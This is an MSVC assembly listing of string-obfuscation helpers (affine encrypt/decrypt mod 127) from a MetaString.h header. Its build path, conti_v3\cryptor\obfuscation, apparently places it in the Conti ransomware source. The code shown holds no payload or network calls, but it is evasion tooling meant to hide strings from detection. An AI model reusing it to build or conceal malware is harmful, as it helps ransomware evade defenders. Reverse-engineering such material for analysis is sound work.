?encrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 39 00 00 00	 mov	 ecx, 57			; 00000039H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 39	 add	 r8d, 57			; 00000039H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 22 00 00 00	 mov	 ecx, 34			; 00000022H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 22	 add	 r8d, 34			; 00000022H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 51 00 00 00	 mov	 ecx, 81			; 00000051H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 51	 add	 r8d, 81			; 00000051H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 1e	 sub	 eax, 30
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5b	 sub	 eax, 91			; 0000005bH
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
